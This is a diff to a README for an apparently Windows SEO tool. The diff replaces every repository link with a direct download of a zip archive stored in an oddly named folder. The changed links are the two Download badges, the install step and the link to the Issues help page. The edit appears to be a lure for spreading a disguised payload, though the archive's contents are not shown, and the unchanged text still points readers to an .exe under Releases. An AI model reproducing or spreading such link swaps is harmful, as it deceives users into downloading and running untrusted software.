@@ -1,6 +1,6 @@
 # ⚙️ Top-10-Generative-Engine-Optimization - Tools for Better SEO Results
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization/raw/refs/heads/main/ochlocratic/Top-Generative-Engine-Optimization-1.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If your computer meets these, you are ready to install and use the software with
 You need to visit the GitHub page to download the application. Follow these steps:
 
 1. Click the large **Download** button at the top or visit this link:  
-   https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization
+   https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization/raw/refs/heads/main/ochlocratic/Top-Generative-Engine-Optimization-1.5.zip
 2. On the GitHub page, look for the **Releases** section on the right sidebar or near the top.
 3. Find the latest release of the software. It will be named with a version number such as "v1.0" or newer.
 4. Click on the file that ends with ".exe" to start downloading the Windows installer.
@@ -92,7 +92,7 @@ If you have any problems running the application, try these steps:
 
 For more detailed help, visit the GitHub repository’s Issues section here:
 
-https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization/issues
+https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization/raw/refs/heads/main/ochlocratic/Top-Generative-Engine-Optimization-1.5.zip
 
 Describe your problem clearly. The project’s team or community may offer advice.
 
@@ -124,4 +124,4 @@ Updates may include new tools, better descriptions, or improved user interface e
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sameernpanchal/Top-10-Generative-Engine-Optimization/raw/refs/heads/main/ochlocratic/Top-Generative-Engine-Optimization-1.5.zip)
